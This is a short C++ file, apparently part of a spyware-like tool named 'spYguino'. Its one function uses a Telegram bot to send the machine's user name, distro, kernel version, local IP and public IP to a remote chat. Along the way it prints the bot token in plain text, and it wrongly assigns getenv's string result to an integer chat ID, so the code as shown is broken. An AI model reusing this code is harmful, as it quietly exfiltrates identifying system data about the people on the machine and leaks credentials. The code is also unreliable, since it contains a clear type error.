#include <csignal>
#include <cstdio>
#include <cstdlib>
#include <exception>
#include <string>

#include "spYguino.h"
#include <tgbot/tgbot.h>
#include <time.h>

using namespace std;
using namespace TgBot;

int sendMessage(const SystemProfile& profile) {

    int64_t chatId = getenv("CHATID");
    
    string token(getenv("TOKEN"));
    printf("Token: %s\n", token.c_str());

    Bot bot(token);

    bot.getApi().sendMessage(chatId, "User: " + profile.user + "\nDistro: " + profile.distro + "\nKernel: " + profile.kernelVersion + "\nIP: " + profile.ip + "\nIP Publica: " + profile.ip_publica);


    return 0;
}
